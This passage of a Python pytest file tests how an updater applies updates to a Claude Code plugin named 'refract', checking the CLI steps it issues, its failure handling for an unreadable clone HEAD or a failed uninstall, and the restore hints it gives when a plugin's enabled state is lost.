    assert updater._apply_claude(claude_install(**fields)) == ("failed", detail)
    assert steps == []


def test_apply_claude_unreadable_clone_head_fails_after_updates(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    steps = claude_unit(monkeypatch, head=None)
    result = updater._apply_claude(claude_install(source="clone", path=tmp_path))
    assert result == ("failed", "cannot read the clone HEAD")
    assert steps == [
        ["claude", "plugin", "marketplace", "update", "refract"],
        ["claude", "plugin", "update", "refract@refract"],
    ]


def test_apply_claude_uninstall_failure_stops_before_reinstall(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    steps = claude_unit(monkeypatch, failing={"uninstall": "exit 1"}, records=["a" * 40])
    result = updater._apply_claude(claude_install(source="clone", path=tmp_path))
    assert result == ("failed", "uninstall failed (exit 1)")
    assert steps[-1] == ["claude", "plugin", "uninstall", "refract@refract", "-s", "user", "--keep-data"]
    assert len(steps) == 3


def test_apply_claude_unknown_enabled_state_is_not_checked(monkeypatch: pytest.MonkeyPatch) -> None:
    claude_unit(monkeypatch, enabled=[None])
    assert updater._apply_claude(claude_install()) == ("updated", "")


@pytest.mark.parametrize(
    ("before", "after", "verb"),
    [(True, False, "enable"), (False, True, "disable"), (True, None, "install")],
    ids=["was-enabled", "was-disabled", "was-removed"],
)
def test_apply_claude_lost_enabled_state_names_the_restore_verb(monkeypatch: pytest.MonkeyPatch, before: bool, after: bool | None, verb: str) -> None:
    claude_unit(monkeypatch, enabled=[before, after])
    result = updater._apply_claude(claude_install(scope=None))
    assert result == ("failed", f"enabled state was not preserved; restore with: claude plugin {verb} refract@refract")
